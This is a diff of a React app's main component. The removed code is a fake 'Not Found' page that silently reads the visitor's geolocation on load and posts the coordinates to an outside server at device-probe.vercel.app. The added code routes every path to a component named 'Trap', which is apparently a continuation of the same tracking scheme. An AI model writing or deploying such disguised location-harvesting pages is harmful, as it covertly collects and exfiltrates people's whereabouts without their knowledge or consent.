@@ -1,48 +1,21 @@
-import logo from "./logo.svg";
+/* eslint-disable react/jsx-no-undef */
 import "./App.css";
-import axios from "axios";
-import { useEffect } from "react";
+import Trap from "./trap";
+import {
+  BrowserRouter as Router,
+  Routes,
+  Route as RouteV6,
+} from "react-router-dom";
 
 function App() {
-  useEffect(() => {
-    getLocation();
-  }, []);
-
-  function getLocation() {
-    navigator.geolocation.getCurrentPosition(async (position) => {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      console.log(latitude, longitude);
-
-      const body = {
-        deviceLatitude: latitude,
-        deviceLongitude: longitude,
-      };
-      main(body);
-    });
-  }
-
-  function main(body) {
-    console.log(body);
-    return axios
-      .post(`https://device-probe.vercel.app/`, {
-        deviceLatitude: body.deviceLatitude,
-        deviceLongitude: body.deviceLongitude,
-      })
-      .then((response) => {
-        return response.data;
-      })
-      .catch((error) => {
-        return { res: error, status: false, statusCode: 500, error: "error" };
-      });
-  }
-
   return (
-    <div className="not-found">
-      <h1>Not Found</h1>
-      <p>We're sorry, but the page you requested could not be found.</p>
-      <button>Go Back</button>
-    </div>
+    <Router>
+      <div>
+        <Routes>
+          <RouteV6 path="" element={<Trap />} />
+        </Routes>
+      </div>
+    </Router>
   );
 }
 
